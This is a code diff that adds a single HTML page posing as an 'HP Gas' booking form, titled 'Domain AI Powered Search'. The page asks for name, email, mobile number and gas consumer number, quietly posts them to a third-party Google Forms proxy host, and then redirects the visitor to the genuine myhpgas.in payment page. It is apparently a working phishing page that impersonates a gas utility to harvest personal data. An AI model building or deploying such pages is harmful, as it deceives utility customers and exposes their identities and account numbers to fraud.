@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Domain AI Powered Search</title>
+	<style>
+		body {
+			color: white;
+			background-color: black;
+		}
+
+		input[type="text"], input[type="email"], input[type="submit"] {
+			width: 300px;
+			height: 30px;
+			font-size: 16px;
+		}
+	</style>
+</head>
+
+<body>
+	<h3>HP Gas</h3>
+	<form id="myForm">
+		<label for="name">Your Name:</label>
+		<br>
+		<input type="text" id="name" name="entry.1355147019" required>
+		<br><br><br>
+
+		<label for="email">Your Email:</label>
+		<br>
+		<input type="email" id="email" name="entry.92760204" required>
+		<br><br><br>
+
+		<label for="mobile">Your Mobile Number:</label>
+		<br>
+		<input type="text" id="mobile" name="entry.1110437410" required>
+		<br><br><br>
+
+		<label for="consumer">Your Consumer Number:</label>
+		<br>
+		<input type="text" id="consumer" name="entry.182207216" required>
+		<br><br><br>
+
+		<input type="submit" value="Book Gas" onclick="submitForm(event)">
+	</form>
+
+	<script>
+		// Submit form to Google Forms API
+		function submitForm(event) {
+			event.preventDefault(); // Prevent form submission if validation fails
+
+			const name = document.getElementById("name").value;
+			const email = document.getElementById("email").value;
+			const mobile = document.getElementById("mobile").value;
+			const consumer = document.getElementById("consumer").value;
+
+			if (name.trim() === '' || email.trim() === '' || mobile.trim() === '' || consumer.trim() === '') {
+				alert('Please fill in all fields.');
+				return;
+			}
+
+			const formData = {
+				"entry.1355147019": name,
+				"entry.92760204": email,
+				"entry.1110437410": mobile,
+				"entry.182207216": consumer
+			};
+
+			fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSd7S6PoVsDZOOKGa81pTiXoJcKIjqOMcPd1GaWHjA0W-C2eIw", {
+				method: "POST",
+				body: JSON.stringify(formData),
+				headers: {
+					"Content-Type": "application/json"
+				}
+			})
+				.then(response => {
+					if (response.ok) {
+						window.location.replace("https://myhpgas.in/myHPGas/QuickPay.aspx");
+					} else {
+						alert("There was a problem submitting the form. Please try again later.");
+					}
+				})
+				.catch(error => {
+					alert("There was a problem submitting the form. Please try again later.");
+				});
+		}
+	</script>
+</body>
+</html>
